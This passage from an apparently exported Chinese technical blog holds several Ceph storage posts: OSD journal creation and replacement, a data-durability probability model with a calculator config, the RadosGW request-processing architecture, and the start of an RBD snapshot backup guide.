    <url>/2019/08/13/storage/ceph/osd-journal-operation/</url>
    <content><![CDATA[<h1 id="部署创建"><a href="#部署创建" class="headerlink" title="部署创建"></a>部署创建</h1><p>可以使用<code>ceph-osd</code>命令单独创建初始化OSD日志</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ceph-osd -i &#123;osd-id&#125; --mkjournal</span><br></pre></td></tr></table></figure>
<p>默认在<code>/var/lib/ceph/osd/ceph-&#123;osd.id&#125;</code>目录下的<code>journal</code>文件中初始化日志数据；也可以通过<code>-c</code>制定配置文件<code>ceph.conf</code>，再在配置文件中制定OSD日志所在路径。</p>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h3 id="osd-journal"><a href="#osd-journal" class="headerlink" title="osd journal"></a>osd journal</h3><p>journal所在的位置，默认为<code>/var/lib/ceph/osd/&#123;cluster&#125;-&#123;osd.id&#125;/jouranl</code>。可以是一个文件也可以是一个块设备。</p>
<h3 id="osd-jouranl-size"><a href="#osd-jouranl-size" class="headerlink" title="osd jouranl size"></a>osd jouranl size</h3><p>日志的大小，不同版本其默认值也不一样。通常根据OSD盘的性能来设置其大小。<br><code>osd journal size = 2 * 写入带宽 * filestore max sync interval</code> 写入带宽一般是固定的，所以可以根据<code>filestore max sync interval</code>来计算journal的大小。或者根据journal大小来设置<code>filestore max sync interval</code>。</p>
<h1 id="更换迁移"><a href="#更换迁移" class="headerlink" title="更换迁移"></a>更换迁移</h1><p>更换Journal盘有2种情况</p>
<h3 id="Journal盘挂了"><a href="#Journal盘挂了" class="headerlink" title="Journal盘挂了"></a>Journal盘挂了</h3><p>只能删除对应的OSD重新创建</p>
<h3 id="Journal还在运行"><a href="#Journal还在运行" class="headerlink" title="Journal还在运行"></a>Journal还在运行</h3><ol>
<li>设置<code>noout</code>标记</li>
<li>停止关联的OSD</li>
<li>下刷 journal 到 osd <code>ceph-osd -i &#123;osd.io&#125; --flush-journal</code></li>
<li>删除旧的 journal 链接</li>
<li>重建journal 链接</li>
<li>重建 journal <code>ceph-osd -i &#123;osd.id&#125; --mkjournal</code></li>
<li>启动关联的OSD</li>
<li>去除<code>noout</code>标记</li>
</ol>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://www.bookstack.cn/read/ceph-handbook/Advance_usage-change_osd_journal.md">更换OSD Journal</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
      </tags>
  </entry>
  <entry>
    <title>Ceph 持久性计算</title>
    <url>/2016/06/23/storage/ceph/persistence-calculation/</url>
    <content><![CDATA[<h1 id="持久性"><a href="#持久性" class="headerlink" title="持久性"></a>持久性</h1><p>持久性是数据丢失的概率，可以用于度量一个存储系统的可靠性，俗称 “多少个9”。数据的放置(DataPlacement)决定了数据持久性，而Ceph的CRUSH MAP又决定了数据的放置，因此CRUSH MAP的设置决定了数据持久性。</p>
<h1 id="数学模型"><a href="#数学模型" class="headerlink" title="数学模型"></a>数学模型</h1><h2 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h2><p><code>P = Pr x M / C（R，N）</code></p>
<h2 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h2><h3 id="P"><a href="#P" class="headerlink" title="P"></a>P</h3><p>P为丢失数据的概率，持久性，可用1-P来计算。</p>
<h3 id="Pr"><a href="#Pr" class="headerlink" title="Pr"></a>Pr</h3><p><code>Pr = P1（any） x P2（any） x P3（any）</code></p>
<p>Pr为一年内R（ceph副本数）个OSD发生故障的概率。</p>
<ul>
<li><p>P1（any）为一年内第一个OSD发生故障的概率<br>硬盘在一定时间内的失败概率符合Possion（伯松）分布 <code>Pn（入,t）</code>(<code>入</code>为lamda)，由于我们不太容易直接计算任意一个OSD顺坏的概率，但可以计算出没有OSD出现故障的概率，再用1减去无OSD节点故障的概率，就得到了<code>P1（any）</code><br><code>入=FIT x N</code> ，<code>FIT=AFR/（24×365）</code>，AFR为硬盘年故障概率;<br><code>t</code>为一年的小时数，24x365</p>
</li>
<li><p>P2（any）为一个OSD恢复周期内第二个OSD发生故障的概率<br><code>入</code>中的N为N-1<br><code>t</code> 为一个OSD恢复周期，<code>OSD恢复周期 = 恢复数据量 / 恢复速度</code>；<code>恢复数据量 = 硬盘容量 x 使用率</code>；<code>恢复速度 = 每个OSD写速度 x 参与恢复的OSD数量</code></p>
</li>
<li><p>P3（any）为一个OSD恢复周期内第三个OSD发生故障的概率<br><code>入</code>中的N为N-2<br><code>t</code> 为一个OSD恢复周期，算法同上</p>
</li>
</ul>
<h3 id="M"><a href="#M" class="headerlink" title="M"></a>M</h3><p>Copy Set个数，copy set上至少有一个PG的所有副本。<br>丢失数据必须是主副本数据同时丢失，数据不可恢复才算。而一个copy set，包含一个PG的所有主副本数据，所以一个copy set损坏（或丢失）导致至少一个PG的主副本数据丢失，数据不可恢复。</p>
<h3 id="C（R，N）"><a href="#C（R，N）" class="headerlink" title="C（R，N）"></a>C（R，N）</h3><p>N为OSD数量（一个OSD对应一个硬盘），R为副本数，C（R，N）为N个OSD中任意挑选R个OSD的组合数。</p>
<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>综上所述，我们能调节的参数包括：</p>
<ul>
<li>OSD恢复周期（recovery time）<br>  增加<code>参与恢复的OSD数量</code>可以缩短<code>OSD恢复周期</code>，从而降低丢失数据的概率</li>
<li>copy set个数<br>  减少copy set个数，可以降低丢失数据的概率</li>
</ul>
<p>以上优化需要修改Crush map</p>
<h1 id="使用prmc计算持久性"><a href="#使用prmc计算持久性" class="headerlink" title="使用prmc计算持久性"></a>使用prmc计算持久性</h1><h2 id="获取prmc"><a href="#获取prmc" class="headerlink" title="获取prmc"></a>获取prmc</h2><p>从github上下载prmc代码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/zhoubofsy/persistence_calculation.git</span><br></pre></td></tr></table></figure>

<h2 id="配置输入参数"><a href="#配置输入参数" class="headerlink" title="配置输入参数"></a>配置输入参数</h2><p>修改<code>config.py</code>文件中的<code>prmc</code>字典</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">算法名称</span></span><br><span class="line">name = &#x27;prmc&#x27;</span><br><span class="line"></span><br><span class="line">prmc = &#123;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">副本数</span></span><br><span class="line">&#x27;replica_num&#x27; : 3, </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">集群OSD总数数量</span></span><br><span class="line">&#x27;osd_num&#x27; : 14,</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">AFR(硬盘年故障率)</span></span><br><span class="line">&#x27;disk_afr&#x27; : 0.017,</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">磁盘平均容量（MB）</span></span><br><span class="line">&#x27;disk_capacity&#x27; : 1000.0,</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">磁盘平均写速度（MB/s）</span></span><br><span class="line">&#x27;disk_writerate&#x27; : 50.0,</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">磁盘使用率</span></span><br><span class="line">&#x27;disk_usage&#x27; : 0.75,</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">一个Host中OSD的数量</span></span><br><span class="line">&#x27;num_osd_in_host&#x27; : 4, </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">一个副本域的host数量</span></span><br><span class="line">&#x27;num_host_in_replic_domain&#x27; : 1,</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">rack数量</span></span><br><span class="line">&#x27;num_rack_in_root&#x27; : 4, </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">副本域数量</span></span><br><span class="line">&#x27;num_replic_domain_in_root&#x27; : 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序会根据<code>name</code>的设置，选择相关的算法，不同的算法会采用不同的配置参数，目前只支持<code>prmc</code>算法</p>
<h2 id="执行计算"><a href="#执行计算" class="headerlink" title="执行计算"></a>执行计算</h2><p>执行<code>main.py</code>进行计算持久性</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./main.py</span><br></pre></td></tr></table></figure>

<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://www.ustack.com/blog/build-block-storage-service/">打造高性能高可靠块存储系统</a></li>
<li><a href="http://blog.csdn.net/xiaoquqi/article/details/43055031#0-tsina-1-70142-397232819ff9a47a7b7e80a40613cfe1">CEPH可靠性的计算方法分析</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>persistence</tag>
      </tags>
  </entry>
  <entry>
    <title>俯瞰 RadosGW</title>
    <url>/2017/11/27/storage/ceph/radosgw-arch/</url>
    <content><![CDATA[<p>Ceph号称统一存储，何为统一，就是将块、文件、对象统一到一起。RadosGW（简称RGW）就是Ceph中提供对象存储服务的模块。它能提供S3和Swift两种对象存储接口，当然也是最主流的两种接口。</p>
<p>本文不打算介绍概念性的东西，只为扒一扒RGW的架构。废话不多讲，直接上图</p>
<p><img src="/images/ceph/rgw_arch.png" alt="rgw_arch.png"></p>
<p>我觉得画的挺清楚了，就不细讲了。</p>
<hr>
<p>一张图不过瘾，再来一发。</p>
<p><img src="/images/ceph/rgw_structural.png" alt="rgw_structural"></p>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>rgw</tag>
      </tags>
  </entry>
  <entry>
    <title>Radosgw 架构</title>
    <url>/2018/11/21/storage/ceph/radosgw-frame/</url>
    <content><![CDATA[<p>** 概述 **</p>
<p>Ceph对象网关是一个构建在<code>librados</code>之上的对象存储接口，它为应用程序访问Ceph 存储集群提供了一个<code>RESTful</code>风格的网关。</p>
<p>Ceph 对象存储支持 2 种接口：</p>
<ol>
<li>兼容S3: 提供了对象存储接口，兼容<code>Amazon S3 RESTful</code>接口的一个大子集。</li>
<li>兼容Swift: 提供了对象存储接口，兼容<code>Openstack Swift</code>接口的一个大子集。</li>
</ol>
<p>Ceph对象存储使用Ceph对象网关守护进程（radosgw 以下简称RGW），它是个与Ceph存储集群交互的FastCGI模块。因为它提供了与<code>OpenStack Swift</code>和<code>Amazon S3</code>兼容的接口，<code>RADOS</code>要有它自己的用户管理。Ceph对象网关可与CephFS客户端或Ceph 块设备客户端共用一个存储集群。S3和Swift接口共用一个通用命名空间，所以你可以用一个接口写如数据、然后用另一个接口取出数据。</p>
<p>** 版本: Mimic **</p>
<p><img src="/images/ceph/radosgw-Frame.png" alt="radosgw-Frame.png"></p>
<h1 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h1><p>RGW 主要由3部分组成。Frontend，用于接收回复外部客户端的http请求；REST，根据外部请求的http信息选择相应的REST、Handler、Op对请求进行分解处理；RGWRados，完成了对数据读写业务的封装。</p>
<h2 id="Frontend"><a href="#Frontend" class="headerlink" title="Frontend"></a>Frontend</h2><p>Frontend包括Frontend Config(<code>RGWFrontendConfig</code>)、Civetweb(<code>RGWCivetWebFrontend</code>)、beast(<code>RGWAsioFrontend</code>)、loadgen(<code>RGWLoadGenFrontend</code>)、fastcgi&#x2F;fcgi(<code>RGWFCGXFrontend</code>)。用一个map管理所有<code>RGWFrontendConfig</code>配置信息对象；用一个list管理所有<code>RGWFrontend</code>对象。每个<code>RGWFrontend</code>实例使用与之对应的<code>RGWFrontendConfig</code>实例进行配置。</p>
<p>Frontend负责接收客户端的请求，然后回调<code>process_request</code>方法处理该请求，并将响应信息返回客户端。</p>
<ul>
<li>Frontend Config</li>
<li>Civetweb</li>
<li>Beast</li>
<li>Loadgen</li>
<li>FastCGI&#x2F;FCGI</li>
</ul>
<h2 id="REST"><a href="#REST" class="headerlink" title="REST"></a>REST</h2><p>REST包括request process、S3 resource、Swift resource、Swift auth resource、Admin Usage resource、Admin User resource、Admin Metadata resource、Admin Realm resource、Admin Config resource、Admin Bucket resource、Admin OpState resource、Admin Log resource、 Admin Replica-log resource。每个resource包含一个RESTMgr、多个Handler、多个Op。</p>
<p>就在刚刚Frontend回调了<code>process_request</code>，<code>process_request</code>通过RESTMgr取得handler，handler再根据Http Method取得Op，Op再对数据进行读写操作。</p>
<h3 id="REST-Resource"><a href="#REST-Resource" class="headerlink" title="REST Resource"></a>REST Resource</h3><h4 id="S3"><a href="#S3" class="headerlink" title="S3"></a>S3</h4><p>** 组成 **</p>
<ul>
<li>RESTMgr<br>  有1个<code>RGWRESTMgr_S3</code>组成。</li>
<li>Handler<br>  有6个Handler组成，分别是：<code>RGWHandler_REST_Service_S3</code>、<code>RGWHandler_REST_Bucket_S3</code>、<code>RGWHandler_REST_Obj_S3</code>、<code>RGWHandler_REST_Service_S3Website</code>、<code>RGWHandler_REST_Bucket_S3Website</code>、<code>RGWHandler_REST_Obj_S3Website</code>。</li>
</ul>
<p>** 功能 **</p>
<ul>
<li><code>RGWHandler_REST_Service_S3</code>, 完成如下功能：<ol>
<li>获取Usage信息</li>
<li>List Buckets </li>
<li>Role信息操作</li>
</ol>
</li>
<li><code>RGWHandler_REST_Bucket_S3</code>，完成如下功能：<ol>
<li>Bucket ACL信息操作</li>
<li>Bucket Core信息操作</li>
<li>Bucket Payment信息操作</li>
<li>Bucket LC信息操作</li>
<li>Bucket Policy信息操作</li>
<li>Bucket操作</li>
</ol>
</li>
<li><code>RGWHandler_REST_Obj_S3</code>，完成如下功能：<ol>
<li>Object ACL操作</li>
<li>Object tagging操作</li>
<li>Object Multipart上传操作</li>
<li>Object 操作</li>
<li>Object Copy操作</li>
</ol>
</li>
</ul>
<h4 id="Swift"><a href="#Swift" class="headerlink" title="Swift"></a>Swift</h4><p>** 组成 **</p>
<ul>
<li>RESTMgr<br>  由<code>RGWRESTMgr_SWIFT</code>、<code>RGWRESTMgr_SWIFT_CrossDomain</code>、<code>RGWRESTMgr_SWIFT_HealthCheck</code>、<code>RGWRESTMgr_SWIFT_Info</code>组成。</li>
<li>Handler<br>  由<code>RGWHandler_REST_Service_SWIFT</code>、<code>RGWHandler_REST_Bucket_SWIFT</code>、<code>RGWHandler_REST_Obj_SWIFT</code>、<code>RGWHandler_REST_SWIFT_Info</code>、<code>RGWHandler_SWIFT_HealthCheck</code>、<code>RGWHandler_SWIFT_CrossDomain</code>组成。</li>
</ul>
<h4 id="Swift-auth"><a href="#Swift-auth" class="headerlink" title="Swift auth"></a>Swift auth</h4><p>** 组成 **</p>
<ul>
<li>RESTMgr<br>  由1个<code>RGWRESTMgr_SWIFT_Auth</code>组成。</li>
<li>Handler<br>  由1个<code>RGWHandler_SWIFT_Auth</code>组成。</li>
</ul>
<h4 id="Admin"><a href="#Admin" class="headerlink" title="Admin"></a>Admin</h4><p>** 组成 **</p>
<ul>
<li>RESTMgr<br>  由<code>RGWRESTMgr_Usage</code>、<code>RGWRESTMgr_User</code>、<code>RGWRESTMgr_Bucket</code>、<code>RGWRESTMgr_Metadata</code>、<code>RGWRESTMgr_Log</code>、<code>RGWRESTMgr_Opstate</code>、<code>RGWRESTMgr_ReplicaLog</code>、<code>RGWRESTMgr_Config</code>、<code>RGWRESTMgr_Realm</code>、<code>RGWRESTMgr_Period</code>组成。</li>
<li>Handler<br>  由<code>RGWHandler_Usage</code>、<code>RGWHandler_User</code>、<code>RGWHandler_Bucket</code>、<code>RGWHandler_Metadata</code>、<code>RGWHandler_Log</code>、<code>RGWHandler_Opstate</code>、<code>RGWHandler_ReplicaLog</code>、<code>RGWHandler_Config</code>、<code>RGWHandler_Realm</code>、<code>RGWHandler_Period</code>组成。</li>
</ul>
<h3 id="Op"><a href="#Op" class="headerlink" title="Op"></a>Op</h3><h4 id="RGWOp"><a href="#RGWOp" class="headerlink" title="RGWOp"></a>RGWOp</h4><ul>
<li>Object Tags<br>  <code>RGWGetObjTags</code> <code>RGWPutObjTags</code> <code>RGWDeleteObjTags</code>实现对象属性<code>user.rgw.x-amz-tagging</code>的查询、设置、删除操作 </li>
<li>Bulk<br>  <code>RGWBulkDelete</code> <code>RGWBulkUploadOp</code> Swift专享批量上传、删除操作</li>
<li>Usage<br>  <code>RGWGetUsage</code> 获取usage信息操作</li>
<li>Stat<br>  <code>RGWStatAccount</code>统计buckets的使用情况 </li>
<li>Bucket<br>  <code>RGWListBuckets</code>列出所有buckets<br>  <code>RGWGetBucketLocation</code>获取bucket location<br>  <code>RGWGetBucketVersioning</code>获取bucket versioning、mfa-delete状态<br>  <code>RGWSetBucketVersioning</code> 设置bucket versioning<br>  <code>RGWGetBucketWebsite</code>获取bucket website信息<br>  <code>RGWSetBucketWebsite</code>设置bucket website<br>  <code>RGWDeleteBucketWebsite</code>删除bucket website<br>  <code>RGWStatBucket</code>获取bucket信息<br>  <code>RGWCreateBucket</code>创建bucket操作<br>  <code>RGWDeleteBucket</code>删除bucket操作<br>  <code>RGWPutBucketPolicy</code>设置bucket policy<br>  <code>RGWGetBucketPolicy</code>获取bucket policy<br>  <code>RGWDeleteBucketPolicy</code>删除bucket policy </li>
<li>Object<br>  <code>RGWPutObj</code> <code>RGWPostObj</code> <code>RGWGetObj</code> <code>RGWDeleteObj</code> <code>RGWCopyObj</code>实现对象的创建、修改、下载、删除、拷贝操作<br>  <code>RGWListBucket</code>列出bucket中的对象 </li>
<li>Metadata<br>  <code>RGWPutMetadataAccount</code>Swift专享保存user所有属性信息(<code>RGWUserInfo</code>)<br>  <code>RGWPutMetadataBucket</code>Swift专享保存bucket所有属性信息<br>  <code>RGWPutMetadataObject</code>Swift专享保存object所有属性信息</li>
<li>ACL<br>  <code>RGWGetACLs</code> <code>RGWPutACLs</code> 实现对bucket或object的访问控制策略属性(<code>user.rgw.acl</code>)的获取、设置操作</li>
<li>LC<br>  <code>RGWGetLC</code> <code>RGWPutLC</code> <code>RGWDeleteLC</code>实现对bucket的生命周期属性(<code>user.rgw.lc</code>)的获取、设置、删除操作</li>
<li>CORS<br>  <code>RGWGetCORS</code> <code>RGWPutCORS</code> <code>RGWDeleteCORS</code> <code>RGWOptionsCORS</code>实现对bucket的CORS属性(<code>user.rgw.cors</code>)的获取、设置、删除、Options操作<br>  <code>RGWGetCrossDomainPolicy</code>Swift专享获取CrossDomain策略信息操作</li>
<li>Payment<br>  <code>RGWGetRequestPayment</code> <code>RGWSetRequestPayment</code>实现对bucket的payment属性的获取、设置操作</li>
<li>Multipart<br>  <code>RGWInitMultipart</code> <code>RGWCompleteMultipart</code> <code>RGWAbortMultipart</code> <code>RGWListMultipart</code> <code>RGWListBucketMultiparts</code> <code>RGWDeleteMultiObj</code>实现对Object的分片上传的操作</li>
<li>HealthCheck<br>  <code>RGWGetHealthCheck</code>Swift专享访问判断配置文件中的<code>rgw_healthcheck_disabling_path</code>是否可以被访问操作</li>
<li>Swift Info<br>  <code>RGWInfo</code>Swift专享获取Swift信息</li>
<li>Layout<br>  <code>RGWGetObjLayout</code>获取Object的layout信息</li>
<li>Bucket MateSearch Config<br>  <code>RGWConfigBucketMetaSearch</code> <code>RGWGetBucketMetaSearch</code> <code>RGWDelBucketMetaSearch</code>实现对Bucket的MetaSearch Config属性的配置、查询、删除操作</li>
<li>Cluster<br>  <code>RGWGetClusterStat</code>获取Cluster状态</li>
</ul>
<h4 id="AdminOp"><a href="#AdminOp" class="headerlink" title="AdminOp"></a>AdminOp</h4><ul>
<li>Usage<br>  <code>RGWOp_Usage_Get</code> <code>RGWOp_Usage_Delete</code>获取usage信息操作</li>
<li>User<br>  <code>RGWOp_User_Info</code> <code>RGWOp_User_Create</code> <code>RGWOp_User_Modify</code> <code>RGWOp_User_Remove</code>user信息的获取、创建、修改、删除操作<br>  <code>RGWOp_Subuser_Create</code> <code>RGWOp_Subuser_Modify</code> <code>RGWOp_Subuser_Remove</code>swift user的创建、修改、删除操作<br>  <code>RGWOp_Key_Create</code> <code>RGWOp_Key_Remove</code>AccessKey、SecretKey的创建、删除操作<br>  <code>RGWOp_Caps_Add</code> <code>RGWOp_Caps_Remove</code>Caps属性的增加、删除操作<br>  <code>RGWOp_Quota_Info</code> <code>RGWOp_Quota_Set</code>Quota的信息的获取、设置操作</li>
<li>Bucket<br>  <code>RGWOp_Bucket_Info</code>获取bucket信息操作<br>  <code>RGWOp_Get_Policy</code>获取bucket的policy信息操作<br>  <code>RGWOp_Check_Bucket_Index</code>检查bucket index操作<br>  <code>RGWOp_Bucket_Link</code> <code>RGWOp_Bucket_Unlink</code>关联、去关联bucket与user操作<br>  <code>RGWOp_Bucket_Remove</code>删除bucket操作<br>  <code>RGWOp_Set_Bucket_Quota</code>设置bucket quota属性操作<br>  <code>RGWOp_Object_Remove</code>删除bucket内的object操作</li>
<li>Metadata<br>  <code>RGWOp_Metadata_List</code> <code>RGWOp_Metadata_Get</code> <code>RGWOp_Metadata_Put</code> <code>RGWOp_Metadata_Delete</code> <code>RGWOp_Metadata_Lock</code> <code>RGWOp_Metadata_Unlock</code>实现对Metadata数据的管理操作</li>
<li>Log<br>  <code>RGWOp_BILog_List</code> <code>RGWOp_BILog_Info</code> <code>RGWOp_BILog_Delete</code> <code>RGWOp_BILog_Status</code>实现对bucket index log的管理<br>  <code>RGWOp_MDLog_List</code> <code>RGWOp_MDLog_Info</code> <code>RGWOp_MDLog_ShardInfo</code> <code>RGWOp_MDLog_Lock</code> <code>RGWOp_MDLog_Unlock</code> <code>RGWOp_MDLog_Notify</code> <code>RGWOp_MDLog_Delete</code> <code>RGWOp_MDLog_Status</code>实现对Metadata log的管理<br>  <code>RGWOp_DATALog_List</code> <code>RGWOp_DATALog_Info</code> <code>RGWOp_DATALog_ShardInfo</code> <code>RGWOp_DATALog_Lock</code> <code>RGWOp_DATALog_Unlock</code> <code>RGWOp_DATALog_Notify</code> <code>RGWOp_DATALog_Delete</code> <code>RGWOp_DATALog_Status</code>实现对Data log的管理</li>
<li>Opstate<br>  <code>RGWOp_Opstate_List</code> <code>RGWOp_Opstate_Set</code> <code>RGWOp_Opstate_Renew</code> <code>RGWOp_Opstate_Delete</code>获取远端object的操作日志管理</li>
<li>ReplicaLog<br>  <code>RGWOp_OBJLog_GetBounds</code> <code>RGWOp_OBJLog_SetBounds</code> <code>RGWOp_OBJLog_DeleteBounds</code>Object同步日志管理<br>  <code>RGWOp_BILog_GetBounds</code> <code>RGWOp_BILog_SetBounds</code> <code>RGWOp_BILog_DeleteBounds</code>Bucket同步日志管理</li>
<li>Zone<br>  <code>RGWOp_ZoneGroupMap_Get</code> <code>RGWOp_ZoneConfig_Get</code>获取zonegroup map 和 zone config操作</li>
<li>Realm<br>  <code>RGWOp_Realm_Get</code>获取realm信息操作<br>  <code>RGWOp_Period_Get</code> <code>RGWOp_Period_Post</code>获取、设置Period信息操作</li>
</ul>
<h3 id="request-process"><a href="#request-process" class="headerlink" title="request process"></a>request process</h3><p>RGW的所有请求都需要回调<code>process_request</code>这个函数来处理，所以<code>process_request</code>处理过程十分重要。</p>
<h4 id="处理流程"><a href="#处理流程" class="headerlink" title="处理流程"></a>处理流程</h4><ol>
<li>获取<code>RGWHandler_REST</code><br> 1.1. 获取<code>RGWRESTMgr</code>对象<br> 各种REST resource 都保存在一个map中，当请求到来时根据传入的<code>frontend_prefix</code>和uri信息在map中查找对应的<code>RGWRESTMgr</code><br> 1.2. 通过<code>RGWRESTMgr</code>的<code>get_handler</code>获取<code>RGWHandler_REST</code>对象<br> 1.3. 调用<code>RGWHandler_REST</code>对象的<code>init</code>方法进行初始化</li>
<li>调用<code>RGWHandler_REST</code>对象的<code>get_op</code>方法获取<code>RGWOp</code>对象</li>
<li>调用<code>RGWOp</code>对象的<code>verify_request</code>的方法，根据不同的操作进行不同的请求授权检查</li>
<li>调用<code>RGWHandler_REST</code>对象的<code>postauth_init</code>方法，进行bucket和tenant解析及验证等操作</li>
<li>调用<code>RGWHandler_REST</code>对象的<code>init_permissions</code>方法，进行初始化权限<br> 5.1. 如果是创建Bucket操作(RGW_OP_CREATE_BUCKET)直接忽略此操作<br> 5.2. 非创建Bucket操作，通过调用<code>RGWHandler_REST</code>对象的<code>do_init_permissions</code>方法进行初始化权限</li>
<li>调用<code>RGWHandler_REST</code>对象的<code>read_permissions</code>方法，获取Object的AccessControlPolicy，若处理的是Bucket直接忽略</li>
<li>调用<code>RGWOp</code>对象的<code>init_processing</code>方法，获取bucket和user的quota信息</li>
<li>调用<code>RGWOp</code>对象的<code>verify_op_mask</code>验证操作的种类是否为<code>RGW_OP_TYPE_READ</code>、<code>RGW_OP_TYPE_WRITE</code>、<code>RGW_OP_TYPE_DELETE</code>中的一个或多个</li>
<li>调用<code>RGWOp</code>对象的<code>verify_permission</code>检查当前的操作在之前的<code>init_permissions</code>获取的策略之下是否有权限</li>
<li>调用<code>RGWOp</code>对象的<code>verify_params</code>检查当前操作的参数</li>
<li>调用<code>RGWOp</code>对象的<code>pre_exec</code>执行预执行操作</li>
<li>调用<code>RGWOp</code>对象的<code>execute</code>执行操作</li>
<li>调用<code>RGWOp</code>对象的<code>complete</code>完成操作，并整理响应结果</li>
</ol>
<h2 id="RGWRados"><a href="#RGWRados" class="headerlink" title="RGWRados"></a>RGWRados</h2><ul>
<li>Bucket Op<br>  使用librados完成Bucket创建、删除、设置、获取等相关操作</li>
<li>Object Op<br>  对Object的读写、属性获取设置等操作，所有操作都分为两类，一类是System Obj，包括metadata信息、realm信息、role信息、bucket信息等rgw内一些配置信息；另一类是Normal Obj，一般为用户上传的object</li>
<li>Cache<br>  对Bucket info信息和User info信息及所有Object的缓存。缓存失效采用LRU算法，采用超时失效＋有效窗口方式判断缓存数据是否失效。</li>
<li>Watcher<br>  监听<code>.rgw.control</code>pool中<code>nodify</code>的对象，当发生对Object（包括System Obj 和 Normal Obj）的增删改操作时，都会触发<code>nodify</code>的更新。Watcher再调用<code>watch_cb</code>去更新Object的缓存信息</li>
<li>Pools<br>  对root pool(<code>.rgw</code>)、control pool(<code>.rgw.control</code>)、gc pool(<code>.rgw.gc</code>)、lc pool(<code>.rgw.lc</code>)、objexp pool、reshard pool的IoCtx管理及操作</li>
<li>GC<br>  对象的删除操作不会真的将对象删除，而是在对象的属性中增加<code>olh.</code>，然后将对象存入<code>.rgw.gc</code>中。GC中的回收线程会每隔1小时处理一次，每次处理从<code>.rgw.gc</code>中获取对象并删除，每次处理的超时时间为1小时。</li>
<li>Obj Expirer(OE)<br>  对象的Version删除功能，通过设置对象的<code>delete_at</code>属性来等待OE清扫线程进行删除，OE清扫线程每隔10分钟处理一次。</li>
<li>LC<br>  bucket通过<code>user.rgw.lc</code>属性配置LC，开启了LC的bucket会被随机分配到<code>.rgw.lc</code>pool的<code>lc.&#123;index&#125;</code>对象上。LC处理线程会随机获取<code>lc.&#123;index&#125;</code>对象，对其上记录的bucket中的object进行处理，判断其是否过期失效，若失效则删除。</li>
<li>Quota<br>  <code>bucket_stats_cache</code>和<code>user_stats_cache</code>分别缓存bucket和user的quota信息，并提供<code>check_quota</code>操作检查是否超出quota的限制。</li>
<li>Reshard<br>  bucket index用于索引bucket内的Object，这些index存在shard文件上。随着bucket内object的数量增加，整个shard文件也在不断增长，当object数量超过“<code>bucket shard数</code>*<code>每个shard最大容纳object数量(默认值：100000)</code>”时，触发reshard操作分配更多的shard文件用于存储index。</li>
<li>Sync<br>  根据metadata log 和 data log 同步 metadata 和 data 数据。当用户对metadata或data写入操作时，保存对应log信息，然后通过notifier模块唤醒SyncProcessor模块来同步log信息并处理。</li>
<li>Realm<br>  包括Realm、zonggroup、zone、period四部分；period用于管理realm配置信息，一个realm包括多个zonegroup，每个zonegroup包括多个zone；一个realm中只能有一个master zonegroup，这个zonegroup中只能有一个master zone。用户修改period时，通过<code>.rgw.root</code>pool中的<code>periods.&#123;realm id&#125;.control</code>对象将通知<code>Realm Watcher</code>进行更改realm配置。</li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>ceph</tag>
        <tag>rgw</tag>
      </tags>
  </entry>
  <entry>
    <title>RBD备份</title>
    <url>/2019/04/28/storage/ceph/rbd-export-import/</url>
    <content><![CDATA[<ul>
<li>Ceph中的RBD备份分为全量备份和增量备份，恢复也有增全量之分。</li>
<li>备份和恢复的操作都是基于快照来操作的。</li>
<li>RBD的format必须为2 （–image-format 2）</li>
</ul>
<h1 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h1><p>备份操作流程，先做一个全量备份，然后每隔一段时间做一个快照，并将快照导出。</p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>创建一个RBD image</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">rbd create --image-format 2 --size 1G crbd_cls17_1</span></span><br></pre></td></tr></table></figure>

<h2 id="全量"><a href="#全量" class="headerlink" title="全量"></a>全量</h2><p>创建一个快照，然后备份从image创建一直到创建快照之前的全量数据</p>
